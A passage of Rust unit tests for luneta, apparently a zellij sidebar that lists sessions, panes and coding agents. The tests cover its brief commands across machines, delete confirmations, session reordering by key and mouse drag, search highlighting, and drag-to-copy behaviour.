        assert_eq!(sidebar.notice.as_deref(), Some("brief: no agent in this pane"));
        sidebar.step(1);
        type_in(&mut sidebar, "bs");
        assert_eq!(sidebar.notice.as_deref(), Some("brief: no agents in newer"));
        // Folded, the older session's row stands for its panes.
        sidebar.step(-2);
        type_in(&mut sidebar, "h");
        assert_eq!(cursor(&sidebar), Some(Place::Session(listed("older", 10))));
        type_in(&mut sidebar, "b");
        assert_eq!(sidebar.key(&char('h'), moment(160_000)), brief(session()));
        type_in(&mut sidebar, "b");
        assert_eq!(sidebar.key(&char('z'), moment(160_000)), brief(every()));
        // The older session moved under the newer one.
        type_in(&mut sidebar, "vJb");
        assert_eq!(sidebar.key(&char('z'), moment(160_000)), brief(here(["newer", "older"])));
    }

    /// `b` on what only pi's agents cover leaves a note: luneta does not read
    /// their transcripts, and an id of pi's names none of Claude Code's. On a
    /// session with agents of both, the brief goes on, and tells of pi's by
    /// its row alone.
    #[test]
    fn a_brief_of_pi_s_agents_alone_leaves_a_note() {
        let mut sidebar = fresh();
        // Each id one of a transcript's could be, whichever harness's it is.
        let (of_pi_id, of_claude_id) = ("01a05a24-2bcb-7198", "7c22-5d4c-3b2a");
        let of_pi = |agent: Agent| Agent {
            harness: Some(Harness::Pi.into()),
            session_id: of_pi_id.to_owned(),
            ..agent
        };
        let pi = of_pi(agent("both", 1, Status::Idle, Some("pi")));
        let claude = Agent {
            session_id: of_claude_id.to_owned(),
            ..agent("both", 2, Status::Idle, Some("claude"))
        };
        let alone = of_pi(agent("alone", 3, Status::Idle, Some("alone")));
        let sessions = vec![
            session("both", 10, vec![pane(1, 0, "/w/a", "pi"), pane(2, 1, "/w/b", "claude")]),
            session("alone", 20, vec![pane(3, 0, "/w/c", "pi")]),
        ];
        sidebar.heard(host(sessions, vec![pi, claude, alone]));
        sidebar.focus(Keys::Sidebar);
        let note = "brief: luneta reads only Claude Code's transcripts so far";

        for (place, key) in [(pane_of("both", 10, 1), 'h'), (pane_of("alone", 20, 3), 's')] {
            sidebar.cursor = Some(Spot::Local(place));
            type_in(&mut sidebar, "b");
            assert_eq!(sidebar.key(&char(key), moment(160_000)), Asked::Nothing, "{key}");
            assert_eq!(sidebar.notice.as_deref(), Some(note), "{key}");
        }

        sidebar.cursor = Some(Spot::Local(pane_of("both", 10, 1)));
        type_in(&mut sidebar, "b");
        let told = |id: u32, name: &str, cwd: &str, transcript| Note {
            on: Machine::Local,
            session: SessionName::parse("both").unwrap(),
            pane: id,
            name: name.to_owned(),
            status: "idle".to_owned(),
            since: Some(SystemTime::UNIX_EPOCH + Duration::from_secs(100)),
            branch: None,
            cwd: cwd.to_owned(),
            transcript,
        };
        let notes = vec![
            told(1, "pi", "/w/a", Transcript::NotRead),
            told(2, "claude", "/w/b", Transcript::Named(SessionId::parse(of_claude_id).unwrap())),
        ];
        let over = Over::Session(Machine::Local, SessionName::parse("both").unwrap());
        let brief = Asked::Brief(Brief::new(over, notes).unwrap());
        assert_eq!(sidebar.key(&char('s'), moment(160_000)), brief);
    }

    /// `b z` briefs you on every session in the rows' order, as you moved
    /// the machines and the sessions of each.
    #[test]
    fn the_brief_goes_in_the_order_you_moved_the_rows_to() {
        let mut sidebar = fresh();
        sidebar.heard(two_each());
        let on = || Machine::Remote(nixos());
        sidebar.order.keep_machines(&[on(), Machine::Local]);
        sidebar.order.keep_sessions(&on(), vec!["dev".to_owned(), "main".to_owned()]);
        sidebar.focus(Keys::Sidebar);
        sidebar.cursor = Some(Spot::Machine(on()));
        type_in(&mut sidebar, "b");
        let name = |name: &str| SessionName::parse(name).unwrap();
        let sessions = vec![
            (on(), name("dev")),
            (on(), name("main")),
            (Machine::Local, name("main")),
            (Machine::Local, name("work")),
        ];
        let unknown = [("me@vps", "unreachable"), ("pi", "reaching…")];
        let unknown = unknown.map(|(it, word)| (it.parse().unwrap(), word)).into();
        let fix = Note {
            on: on(),
            session: name("main"),
            pane: 1,
            name: "fix".to_owned(),
            status: "waiting".to_owned(),
            since: Some(SystemTime::UNIX_EPOCH + Duration::from_secs(100)),
            branch: None,
            cwd: "/w/b".to_owned(),
            transcript: Transcript::Unnamed,
        };
        let every = Brief::new(Over::Sessions { sessions, unknown }, vec![fix]).unwrap();
        assert_eq!(sidebar.key(&char('z'), moment(160_000)), Asked::Brief(every));
    }

    /// The Brief group's keys brief you on another machine's agents as on
    /// this one's: `b z` on every session of every machine, in the rows'
    /// order, and on each machine lunetad does not reach as one whose
    /// sessions are unknown; `b s` and `b h` on a machine's header on its
    /// sessions, this one's too; and on its session's row or its pane's, on
    /// the session or the agent there. Of a machine lunetad no longer
    /// reaches, or no longer watches, the sidebar says so; and with no agent
    /// where it reaches, it says whose sessions are unknown.
    #[test]
    fn the_brief_s_keys_brief_you_on_every_machine_s_agents() {
        let mut sidebar = fresh();
        sidebar.heard(machines());
        sidebar.focus(Keys::Sidebar);
        let on = || Machine::Remote(nixos());
        let main = || SessionName::parse("main").unwrap();
        let fix = Note {
            on: on(),
            session: main(),
            pane: 1,
            name: "fix".to_owned(),
            status: "waiting".to_owned(),
            since: Some(SystemTime::UNIX_EPOCH + Duration::from_secs(100)),
            branch: None,
            cwd: "/w/b".to_owned(),
            transcript: Transcript::Unnamed,
        };
        let brief = |over: Over| Asked::Brief(Brief::new(over, vec![fix.clone()]).unwrap());
        let unknown = [("me@vps", "unreachable"), ("pi", "reaching…")];
        let unknown = unknown.map(|(it, word)| (it.parse().unwrap(), word)).into();
        let every = Over::Sessions { sessions: vec![(Machine::Local, main()), (on(), main())], unknown };
        let session = Place::Session(listed("main", 20));
        let pane = pane_of("main", 20, 1);
        for (spot, key, over) in [
            (Spot::Machine(on()), 'z', every),
            (Spot::Machine(on()), 's', Over::Machine(on(), vec![main()])),
            (Spot::Machine(on()), 'h', Over::Machine(on(), vec![main()])),
            (Spot::Remote(nixos(), session), 'h', Over::Session(on(), main())),
            (Spot::Remote(nixos(), pane.clone()), 'h', Over::Agent(on(), main(), 1)),
        ] {
            sidebar.cursor = Some(spot);
            type_in(&mut sidebar, "b");
            assert_eq!(sidebar.key(&char(key), moment(160_000)), brief(over), "{key}");
        }
        sidebar.cursor = Some(Spot::Machine(Machine::Local));
        type_in(&mut sidebar, "bs");
        assert_eq!(sidebar.notice.as_deref(), Some("brief: no agents on this machine"));
        // The menu opened while lunetad reached nixos.
        sidebar.cursor = Some(Spot::Remote(nixos(), pane));
        type_in(&mut sidebar, "b");
        let mut host = machines();
        host.remotes[0] = remote("nixos", down(100));
        sidebar.heard(host.clone());
        assert_eq!(sidebar.key(&char('h'), moment(160_000)), Asked::Nothing);
        assert_eq!(sidebar.notice.as_deref(), Some("brief: lunetad does not reach nixos now"));
        sidebar.cursor = Some(Spot::Machine(Machine::Local));
        type_in(&mut sidebar, "b");
        assert_eq!(sidebar.key(&char('z'), moment(160_000)), Asked::Nothing);
        let nowhere = "brief: no agents to brief you on; lunetad does not reach nixos, me@vps, pi \
                       now";
        assert_eq!(sidebar.notice.as_deref(), Some(nowhere));
        // The menu opened while luneta's hosts file named nixos.
        sidebar.heard(machines());
        sidebar.cursor = Some(Spot::Machine(on()));
        type_in(&mut sidebar, "b");
        host.remotes.remove(0);
        sidebar.heard(host);
        assert_eq!(sidebar.key(&char('s'), moment(160_000)), Asked::Nothing);
        assert_eq!(sidebar.notice.as_deref(), Some("brief: lunetad does not reach nixos now"));
    }

    /// While lunetad does not answer, what it said last of the agents may be
    /// out of date; and while it cannot read one of Claude Code's session
    /// files, nor tell where its process runs, the file's agent may be in any
    /// pane. The sidebar says so at its bottom, and a delete asks first,
    /// whatever it ends, saying why, and `y` goes ahead.
    #[test]
    fn a_delete_asks_first_while_luneta_cannot_tell_the_agents() {
        let unread = "lunetad cannot read 1 of Claude Code's session files";
        let unplaced = format!("{unread}, nor tell where its agent runs");
        let away: fn(&mut Sidebar) = |sidebar| sidebar.lost("gone".to_owned());
        // As a daemon older than its list of the files says it.
        let unreadable: fn(&mut Sidebar) = |sidebar| {
            let host = sidebar.host.clone().expect("the sidebar has heard the host");
            sidebar.heard(Host { unread: 1, ..host });
        };
        let away = (away, "lunetad: gone", "lunetad does not answer");
        for (untold, note, why) in [away, (unreadable, unread, unplaced.as_str())] {
            let mut sidebar = two_sessions();
            sidebar.focus(Keys::Sidebar);
            untold(&mut sidebar);
            sidebar.step(2);
            type_in(&mut sidebar, "d");
            let closes = || closes_here(1, "newer", 1);
            assert_eq!(sidebar.key(&char('d'), moment(160_000)), closes());
            assert_eq!(sidebar.closes(1, Ok(Closes::Pane)), Asked::Nothing);
            let lines = screen(&mut sidebar, true, 160, 16);
            let lines: Vec<&str> = lines.iter().map(|line| line.trim()).collect();
            let asks = format!("Close the pane? luneta cannot tell which agents it ends: {why}");
            assert!(lines.contains(&note), "{lines:#?}");
            assert!(lines.contains(&asks.as_str()), "{lines:#?}");
            assert_eq!(sidebar.key(&char('y'), moment(160_000)), closes());
            let act = Act::Pane {
                session: session_name("newer"),
                started: listed("newer", 20).started(),
                pane: 1,
            };
            assert_eq!(sidebar.closes(1, Ok(Closes::Pane)), delete_here(act));
        }
    }

    /// The agent of a session file lunetad cannot read is in the pane its
    /// process runs in, as lunetad says: what it is doing no one can tell,
    /// so a delete that ends it asks first, and one that does not goes at
    /// once. The sidebar says at its bottom that a file does not read.
    #[test]
    fn a_delete_asks_first_where_an_agent_s_session_file_does_not_read() {
        for (pane, asks) in [(1, true), (7, false)] {
            let mut sidebar = two_sessions();
            sidebar.focus(Keys::Sidebar);
            let host = sidebar.host.clone().expect("the sidebar has heard the host");
            let session = Some("newer".to_owned());
            let zellij = Zellij { named: "newer".to_owned(), session, pane };
            let unread_files = vec![UnreadFile { pid: 200, zellij: Some(zellij) }];
            sidebar.heard(Host { unread: 1, unread_files, ..host });
            sidebar.step(2);
            type_in(&mut sidebar, "d");
            let closes = closes_here(1, "newer", 1);
            assert_eq!(sidebar.key(&char('d'), moment(160_000)), closes);
            let act = Act::Pane {
                session: session_name("newer"),
                started: listed("newer", 20).started(),
                pane: 1,
            };
            let went = sidebar.closes(1, Ok(Closes::Pane));
            let lines = screen(&mut sidebar, true, 120, 16);
            let lines: Vec<&str> = lines.iter().map(|line| line.trim()).collect();
            let note = "lunetad cannot read 1 of Claude Code's session files";
            assert!(lines.contains(&note), "{lines:#?}");
            let asked = lines.contains(&"Close the pane? 1 agent, 1 unknown");
            assert_eq!((went == delete_here(act), asked), (!asks, asks), "pane {pane}");
        }
    }

    /// `d d` plans by what zellij says closing the pane closes, and the
    /// highlight goes to the row after it once the pane is gone.
    #[test]
    fn a_delete_goes_by_what_zellij_closes_and_the_highlight_past_it() {
        let mut sidebar = two_sessions();
        sidebar.focus(Keys::Sidebar);
        sidebar.step(1);
        assert_eq!(sidebar.key(&char('d'), moment(160_000)), Asked::Nothing);
        let closes = closes_here(1, "older", 2);
        assert_eq!(sidebar.key(&char('d'), moment(160_000)), closes);
        let act = Act::Pane {
            session: session_name("older"),
            started: listed("older", 10).started(),
            pane: 2,
        };
        assert_eq!(sidebar.closes(1, Ok(Closes::Pane)), delete_here(act));
        assert!(sidebar.menu.is_none());
        sidebar.heard(host(
            vec![
                session("newer", 20, vec![pane(1, 0, "/w/b", "fish")]),
                session("older", 10, vec![pane(1, 0, "/w/luneta/main", "claude")]),
            ],
            vec![agent("older", 1, Status::Waiting, Some("fold"))],
        ));
        assert_eq!(cursor(&sidebar), Some(pane_of("newer", 20, 1)));
    }

    /// A delete that would end an agent at work asks first, and `y` asks
    /// zellij again before it goes ahead. The session luneta's zellij is in
    /// goes once it is in the newest of the others.
    #[test]
    fn a_delete_that_ends_an_agent_at_work_asks_and_looks_again() {
        let mut sidebar = two_sessions();
        sidebar.focus(Keys::Sidebar);
        type_in(&mut sidebar, "d");
        let closes = || closes_here(1, "older", 1);
        assert_eq!(sidebar.key(&char('d'), moment(160_000)), closes());
        let tab = || Closes::Tab { id: 0, panes: vec![1] };
        assert_eq!(sidebar.closes(1, Ok(tab())), Asked::Nothing);
        assert_eq!(bottom(&mut sidebar), " <y> Yes <BS> Back <ESC> Close");
        let lines = screen(&mut sidebar, true, 32, 16);
        assert_eq!(lines[13], " Close its tab? 1 agent, 1");
        assert_eq!(sidebar.key(&char('y'), moment(160_000)), closes());
        let act = Act::Tab {
            session: session_name("older"),
            started: listed("older", 10).started(),
            tab: 0,
            panes: vec![1],
        };
        assert_eq!(sidebar.closes(1, Ok(tab())), delete_here(act));

        type_in(&mut sidebar, "d");
        assert_eq!(sidebar.key(&char('s'), moment(160_000)), Asked::Nothing);
        let lines = screen(&mut sidebar, true, 32, 16);
        assert_eq!(lines[13..15], [" Delete session older? 1", " agent, 1 waiting"]);
        let to = Place::Session(listed("newer", 20));
        let started = listed("older", 10).started();
        let leave = Act::Leave { session: session_name("older"), started, to };
        assert_eq!(sidebar.key(&char('s'), moment(160_000)), delete_here(leave));
        assert!(sidebar.menu.is_none());
    }

    /// As luneta's zellij leaves the session a delete kills, the sidebar says
    /// where it goes, with the keys or without, until zellij titles it there
    /// or says it stayed. A client that ended on its way leaves nothing to
    /// say: the one that takes its place goes nowhere, whichever session it
    /// is in, and what zellij says late of the go changes nothing.
    #[test]
    fn the_sidebar_says_where_a_delete_goes_while_it_goes() {
        let going = |sidebar: &mut Sidebar, focused: bool| {
            let lines = screen(sidebar, focused, 32, 16);
            lines.iter().any(|line| line.contains("Going to newer; this session"))
        };
        let newer = Place::Session(listed("newer", 20));
        let mut sidebar = two_sessions();
        sidebar.leaving(&newer);
        assert!(going(&mut sidebar, true));
        assert!(going(&mut sidebar, false));
        sidebar.titled("newer | fish".to_owned());
        assert!(!going(&mut sidebar, false));

        let mut sidebar = two_sessions();
        let look = sidebar.leaving(&newer).expect("a look");
        sidebar.stayed(look.number);
        assert!(!going(&mut sidebar, false));

        let mut sidebar = two_sessions();
        let look = sidebar.leaving(&newer).expect("a look");
        let rejoined = sidebar.rejoining(&session_name("older"));
        assert!(!going(&mut sidebar, false));
        sidebar.stayed(look.number);
        let clients = vec![Client { id: 2, pane: Some(1) }];
        let before = Some(Before::Listed(vec![]));
        sidebar.looked(Looked { number: rejoined.number, went: None, clients, before });
        assert!(!going(&mut sidebar, false));
        assert_eq!((sidebar.here(), sidebar.going()), (Some("older"), None));
    }

    /// While luneta's zellij is on its way to a session, it may be in that
    /// one or the one it leaves: a key that would kill either says so, and
    /// kills neither, rather than luneta's own with it, or wait for ever on a
    /// go that zellij would not be sent. Once it is there, it does.
    #[test]
    fn no_session_goes_while_luneta_s_zellij_is_on_its_way_to_one() {
        let mut sidebar = two_sessions();
        sidebar.focus(Keys::Sidebar);
        sidebar.sending(&session_name("newer"));
        let moving = |sidebar: &Sidebar| {
            sidebar.menu.is_none()
                && sidebar.notice.as_ref().is_some_and(|it| it.contains("which session it is in"))
        };
        let older = pane_of("older", 10, 1);
        let newer = pane_of("newer", 20, 1);
        for place in [older, newer.clone()] {
            sidebar.cursor = Some(Spot::Local(place));
            type_in(&mut sidebar, "d");
            assert_eq!(sidebar.key(&char('s'), moment(160_000)), Asked::Nothing);
            assert!(moving(&sidebar));
        }
        // Nor does its last pane close it.
        type_in(&mut sidebar, "d");
        let closes = closes_here(3, "newer", 1);
        assert_eq!(sidebar.key(&char('d'), moment(160_000)), closes);
        assert_eq!(sidebar.closes(3, Ok(Closes::Session)), Asked::Nothing);
        assert!(moving(&sidebar));

        sidebar.titled("newer | fish".to_owned());
        type_in(&mut sidebar, "d");
        let to = Place::Session(listed("older", 10));
        let started = listed("newer", 20).started();
        let leave = Act::Leave { session: session_name("newer"), started, to };
        assert_eq!(sidebar.key(&char('s'), moment(160_000)), delete_here(leave));
    }

    /// luneta's zellij may be in either session while it goes from one to
    /// the other, and is in the one it went to once zellij titles it there.
    /// A client that takes the place of one that ended is in its session or
    /// none, whatever the one before was in.
    #[test]
    fn luneta_s_zellij_may_be_in_either_session_while_on_its_way() {
        let mut sidebar = two_sessions();
        let seats = |names: &[&str]| -> Vec<SessionName> {
            names.iter().map(|name| session_name(name)).collect()
        };
        assert_eq!(sidebar.seats(), seats(&["older"]));
        sidebar.sending(&session_name("newer"));
        assert_eq!(sidebar.seats(), seats(&["older", "newer"]));
        sidebar.titled("newer | fish".to_owned());
        assert_eq!(sidebar.seats(), seats(&["newer"]));
        sidebar.rejoining(&session_name("older"));
        assert_eq!(sidebar.seats(), seats(&["older"]));
    }

    /// A client that takes the place of one that ended on its way to a
    /// session is one luneta has yet to find, in that session too: zellij
    /// sends it no title where the tab had the same one before, and luneta
    /// looks for it, and has it there once zellij lists it.
    #[test]
    fn a_client_that_rejoins_where_the_last_was_going_is_looked_for() {
        let mut sidebar = two_sessions();
        sidebar.went(&Place::Session(listed("newer", 20)));
        let look = sidebar.rejoining(&session_name("newer"));
        assert_eq!(look.session, "newer");
        let clients = vec![Client { id: 2, pane: Some(1) }];
        let before = Some(Before::Listed(vec![]));
        sidebar.looked(Looked { number: look.number, went: None, clients, before });
        assert_eq!((sidebar.here(), sidebar.going()), (Some("newer"), None));
    }

    /// The highlight goes to the best match as what is typed changes, and
    /// stays where it is moved to as the daemon says more.
    #[test]
    fn the_highlight_seeks_the_best_match_only_as_the_search_changes() {
        let mut sidebar = searched();
        let pane = |pane| Some(pane_of("bipa", 10, pane));
        type_in(&mut sidebar, "/pi");
        assert_eq!(cursor(&sidebar), pane(3));
        sidebar.key(&KeyEvent::new(KeyCode::Up, KeyModifiers::NONE), moment(160_000));
        sidebar.heard(sidebar.host.clone().expect("heard"));
        assert_eq!(cursor(&sidebar), pane(1));
        type_in(&mut sidebar, "x");
        assert_eq!(cursor(&sidebar), pane(3));
    }

    /// The rows the sidebar draws under this machine's header, focused, with
    /// no rule after a session's name, and which of them the highlight is on.
    fn drawn_rows(sidebar: &mut Sidebar) -> (Vec<String>, Vec<usize>) {
        let (lines, lit) = seen(sidebar, true, 32, 27);
        let from = sessions_from(&lines);
        let rows = lines[from..].iter().take_while(|line| !line.is_empty());
        let rows = rows.map(|line| line.trim_end_matches(['─', ' ']).to_owned()).collect();
        (rows, lit.iter().map(|y| usize::from(*y) - from).collect())
    }

    /// `v` selects the session of the highlighted row, `j` and `k` grow the
    /// selection from session to session, and `J` and `K` move what it holds,
    /// each session with its panes, no further than the ends, while it stays
    /// selected, whatever the mouse does with no button down. The order
    /// outlasts the daemon's next list. `Esc` only ends the selection, the
    /// highlight going on from its end to a row it stops on without one, and
    /// leaves the sidebar after. With no selection, `K` moves nothing.
    #[test]
    fn v_selects_sessions_that_shifted_j_and_k_move() {
        let mut sidebar = searched();
        sidebar.focus(Keys::Sidebar);
        type_in(&mut sidebar, "vjjk");
        let (_, lit) = drawn_rows(&mut sidebar);
        assert_eq!(lit, (0..6).collect::<Vec<_>>());
        sidebar.mouse(mouse(MouseEventKind::Moved, 10, 4), Rect::new(0, 0, 32, 26));
        // Shift and all, as a terminal sends it as text.
        let shifted = |c| KeyEvent::new(KeyCode::Char(c), KeyModifiers::SHIFT);
        sidebar.key(&shifted('J'), moment(160_000));
        sidebar.key(&shifted('J'), moment(160_000));
        let moved = [" ▾ zed", "     \u{eb31} htop", "       z-e-d", "       less logs", " ▾ bipa"];
        let (rows, lit) = drawn_rows(&mut sidebar);
        assert_eq!(rows[..5], moved);
        assert_eq!(rows[8], " ▾ notes");
        assert_eq!(lit, (4..10).collect::<Vec<_>>());
        sidebar.heard(searched().host.unwrap());
        assert_eq!(&drawn_rows(&mut sidebar).0[..5], moved);

        let esc = KeyEvent::new(KeyCode::Esc, KeyModifiers::NONE);
        assert_eq!(sidebar.key(&esc, moment(160_000)), Asked::Nothing);
        assert_eq!(drawn_rows(&mut sidebar).1, [9]);
        sidebar.key(&shifted('K'), moment(160_000));
        assert_eq!(&drawn_rows(&mut sidebar).0[..5], moved);
        assert_eq!(sidebar.key(&esc, moment(160_000)), Asked::Leave);
    }

    /// `v` selects a folded session from its row, and any other key ends the
    /// selection and does what it does: `Enter` goes.
    #[test]
    fn a_folded_session_is_selected_from_its_row() {
        let mut sidebar = searched();
        sidebar.focus(Keys::Sidebar);
        type_in(&mut sidebar, "GhvkK");
        let (rows, _) = drawn_rows(&mut sidebar);
        assert_eq!(rows[..4], [" ▾ notes", "     \u{e795} me/Documents", " ▸ zed", " ▾ bipa"]);
        let enter = KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE);
        let fish = pane_of("notes", 20, 1);
        assert_eq!(sidebar.key(&enter, moment(160_000)), go_here(fish));
        assert!(matches!(sidebar.moving, Moving::Still));
    }

    /// A press on the row of a pane that runs a program lifts nothing, and a
    /// note says why. One on a session's row lifts the session once the mouse
    /// moves a line, and takes the focus: it shows where it lands, lit, with
    /// its panes, the others making room. Let go, it stays where it showed,
    /// for the daemon's next list too.
    #[test]
    fn a_session_dragged_lands_where_it_shows() {
        let mut sidebar = searched();
        let area = Rect::new(0, 0, 32, 27);
        let (before, _) = drawn_rows(&mut sidebar);
        let left = MouseButton::Left;
        let mut act = |kind, column, row| sidebar.mouse(mouse(kind, column, row), area);
        assert_eq!(act(MouseEventKind::Down(left), 10, 5), Asked::Nothing);
        assert_eq!(act(MouseEventKind::Drag(left), 10, 7), Asked::Nothing);
        act(MouseEventKind::Up(left), 10, 7);
        assert_eq!(sidebar.notice.as_deref(), Some("not moved: it runs `a-p-i-x`"));
        sidebar.clear_notice();
        assert_eq!(drawn_rows(&mut sidebar).0, before);

        // notes's row, under bipa's, past zed's.
        sidebar.mouse(mouse(MouseEventKind::Down(left), 10, 8), area);
        assert_eq!(sidebar.mouse(mouse(MouseEventKind::Drag(left), 10, 13), area), Asked::Take);
        let last = [" ▾ zed", "     \u{eb31} htop", "       z-e-d", "       less logs", " ▾ notes"];
        let (rows, lit) = drawn_rows(&mut sidebar);
        assert_eq!(rows[4..9], last);
        assert_eq!(lit, [8, 9]);
        assert_eq!(sidebar.mouse(mouse(MouseEventKind::Up(left), 10, 13), area), Asked::Nothing);
        assert_eq!(cursor(&sidebar), Some(pane_of("notes", 20, 1)));
        sidebar.heard(searched().host.unwrap());
        assert_eq!(&drawn_rows(&mut sidebar).0[4..9], last);

        // zed's row, under bipa's, to the top.
        sidebar.mouse(mouse(MouseEventKind::Down(left), 10, 8), area);
        sidebar.mouse(mouse(MouseEventKind::Drag(left), 10, 4), area);
        sidebar.mouse(mouse(MouseEventKind::Up(left), 10, 4), area);
        let (rows, _) = drawn_rows(&mut sidebar);
        assert_eq!(rows[..5], [" ▾ zed", "     \u{eb31} htop", "       z-e-d", "       less logs", " ▾ bipa"]);
    }

    /// A session lifted goes back where it was once let go off the sidebar,
    /// on `Esc`, and once the mouse moves with no button down, after a
    /// release luneta did not hear. Off the sidebar, it shows where it was.
    #[test]
    fn a_session_lifted_goes_back_off_the_sidebar_or_on_esc() {
        let mut sidebar = searched();
        let area = Rect::new(0, 0, 32, 26);
        let (listed, _) = drawn_rows(&mut sidebar);
        let left = MouseButton::Left;
        // zed's row, to the top.
        let lift_zed = |sidebar: &mut Sidebar| {
            sidebar.mouse(mouse(MouseEventKind::Down(left), 10, 10), area);
            sidebar.mouse(mouse(MouseEventKind::Drag(left), 10, 4), area);
            assert_ne!(drawn_rows(sidebar).0, listed);
        };
        lift_zed(&mut sidebar);
        sidebar.mouse(mouse(MouseEventKind::Drag(left), 40, 4), area);
        assert_eq!(drawn_rows(&mut sidebar), (listed.clone(), (6..10).collect()));
        sidebar.mouse(mouse(MouseEventKind::Up(left), 40, 4), area);
        assert_eq!(drawn_rows(&mut sidebar).0, listed);

        lift_zed(&mut sidebar);
        assert_eq!(sidebar.key(&KeyEvent::from(KeyCode::Esc), moment(160_000)), Asked::Nothing);
        assert!(!sidebar.pressed());
        assert_eq!(drawn_rows(&mut sidebar).0, listed);

        lift_zed(&mut sidebar);
        sidebar.mouse(mouse(MouseEventKind::Moved, 10, 4), area);
        sidebar.mouse(mouse(MouseEventKind::Up(left), 10, 4), area);
        assert_eq!(drawn_rows(&mut sidebar).0, listed);
    }

    /// While the left button is down on the sidebar, it has the keys: `v`
    /// selects nothing under the session it lifts, nor `n` opens the menu.
    /// `Esc` lets go, so that the release is no click.
    #[test]
    fn the_left_button_down_has_the_keys() {
        let mut sidebar = searched();
        sidebar.focus(Keys::Sidebar);
        let area = Rect::new(0, 0, 32, 26);
        drawn_rows(&mut sidebar);
        let left = MouseButton::Left;
        // zed's row, to the top.
        sidebar.mouse(mouse(MouseEventKind::Down(left), 10, 10), area);
        type_in(&mut sidebar, "vn");
        sidebar.mouse(mouse(MouseEventKind::Drag(left), 10, 4), area);
        sidebar.mouse(mouse(MouseEventKind::Up(left), 10, 4), area);
        let (rows, lit) = drawn_rows(&mut sidebar);
        assert_eq!(rows[0], " ▾ zed");
        assert_eq!(lit, [1]);
        assert!(sidebar.menu.is_none());

        sidebar.mouse(mouse(MouseEventKind::Down(left), 10, 5), area);
        assert_eq!(sidebar.key(&KeyEvent::from(KeyCode::Esc), moment(160_000)), Asked::Nothing);
        assert_eq!(sidebar.mouse(mouse(MouseEventKind::Up(left), 10, 5), area), Asked::Nothing);
    }

    /// What is typed in the search narrows the rows, and a press on a
    /// session's row lifts nothing.
    #[test]
    fn a_search_typed_lifts_no_session() {
        let mut sidebar = searched();
        sidebar.focus(Keys::Sidebar);
        type_in(&mut sidebar, "/z");
        let area = Rect::new(0, 0, 32, 22);
        let (listed, _) = drawn_rows(&mut sidebar);
        assert_eq!(listed[0], " ▾ zed");
        let left = MouseButton::Left;
        sidebar.mouse(mouse(MouseEventKind::Down(left), 10, 3), area);
        assert_eq!(sidebar.mouse(mouse(MouseEventKind::Drag(left), 10, 6), area), Asked::Nothing);
        sidebar.mouse(mouse(MouseEventKind::Up(left), 10, 6), area);
        assert_eq!(drawn_rows(&mut sidebar).0, listed);
    }

    /// The sidebar drawn into `area`, with the keys where they are.
    fn framed(sidebar: &mut Sidebar, area: Rect) -> Buffer {
        let mut buffer = Buffer::empty(area);
        sidebar.draw(&mut buffer, area, moment(160_000));
        buffer
    }

    /// The cells of `buffer` drawn reversed.
    fn reversed(buffer: &Buffer) -> Vec<(u16, u16)> {
        let on = |at: &Position| buffer[*at].modifier.contains(Modifier::REVERSED);
        buffer.area.positions().filter(on).map(|at| (at.x, at.y)).collect()
    }

    /// The left button down at `from`, dragged to `to`, on the sidebar as drawn
    /// last into `area`.
    fn dragged(sidebar: &mut Sidebar, area: Rect, from: (u16, u16), to: (u16, u16)) {
        let left = MouseButton::Left;
        sidebar.mouse(mouse(MouseEventKind::Down(left), from.0, from.1), area);
        sidebar.mouse(mouse(MouseEventKind::Drag(left), to.0, to.1), area);
    }

    /// What the left button asks, down at `from`, dragged to `to` and let go.
    fn swept(sidebar: &mut Sidebar, area: Rect, from: (u16, u16), to: (u16, u16)) -> Asked {
        dragged(sidebar, area, from, to);
        sidebar.mouse(mouse(MouseEventKind::Up(MouseButton::Left), to.0, to.1), area)
    }

    fn copied(text: &str) -> Asked {
        Asked::CopyText(text.to_owned())
    }

    /// A drag copies what it went over as it lets go, and goes nowhere: along
    /// a pane's row, the way back, and over lines, from any line of the sidebar.
    /// It has the mouse over zellij too, and copies only the sidebar's column.
    /// Over nothing but blanks, there is nothing to copy, and nothing stays
    /// reversed to say that there was.
    #[test]
    fn a_drag_copies_what_it_went_over_as_it_lets_go() {
        let mut sidebar = searched();
        let area = Rect::new(0, 0, 32, 26);
        framed(&mut sidebar, area);
        let here = sidebar.cursor.clone();
        assert_eq!(swept(&mut sidebar, area, (7, 5), (13, 5)), copied("a-p-i-x"));
        assert_eq!(swept(&mut sidebar, area, (13, 5), (9, 5)), copied("p-i-x"));
        // Let go further on than it was last heard to drag.
        dragged(&mut sidebar, area, (7, 5), (9, 5));
        let up = sidebar.mouse(mouse(MouseEventKind::Up(MouseButton::Left), 13, 5), area);
        assert_eq!(up, copied("a-p-i-x"));
        assert_eq!(swept(&mut sidebar, area, (2, 0), (8, 0)), copied("luneta"));
        assert_eq!(sidebar.cursor, here);

        dragged(&mut sidebar, area, (9, 5), (40, 6));
        assert!(sidebar.pressed());
        let left = MouseButton::Left;
        let up = sidebar.mouse(mouse(MouseEventKind::Up(left), 40, 6), area);
        assert_eq!(up, copied("p-i-x\n       dda-bank-slip"));
        assert!(!sidebar.pressed());

        assert_eq!(swept(&mut sidebar, area, (5, 2), (25, 2)), Asked::Nothing);
        assert_eq!(reversed(&framed(&mut sidebar, area)), []);
    }

    /// A hand that clicks moves a little: a press let go on its line within a
    /// cell of where it went down is a click, one further along is a sweep, and
    /// one let go a line off within a cell is neither, and copies nothing.
    #[test]
    fn a_click_is_a_click_though_the_hand_moves_a_cell() {
        let mut sidebar = searched();
        let area = Rect::new(0, 0, 32, 26);
        framed(&mut sidebar, area);
        let api = || go_here(pane_of("bipa", 10, 1));
        assert_eq!(swept(&mut sidebar, area, (10, 5), (11, 5)), api());
        assert_eq!(swept(&mut sidebar, area, (10, 5), (9, 5)), api());
        assert_eq!(swept(&mut sidebar, area, (10, 5), (12, 5)), copied("-i-"));
        assert_eq!(swept(&mut sidebar, area, (10, 5), (11, 6)), Asked::Nothing);
    }

    /// On what lifts, a drag along the line first sweeps, and goes on over
    /// other lines with nothing lifted; straight off the line it lifts, as ever,
    /// and a hand that moved a cell along it on the way lifts all the same.
    #[test]
    fn a_drag_along_a_session_s_row_sweeps_and_one_off_it_lifts() {
        let mut sidebar = searched();
        let area = Rect::new(0, 0, 32, 26);
        let (listed, _) = drawn_rows(&mut sidebar);
        let left = MouseButton::Left;
        sidebar.mouse(mouse(MouseEventKind::Down(left), 3, 4), area);
        sidebar.mouse(mouse(MouseEventKind::Drag(left), 6, 4), area);
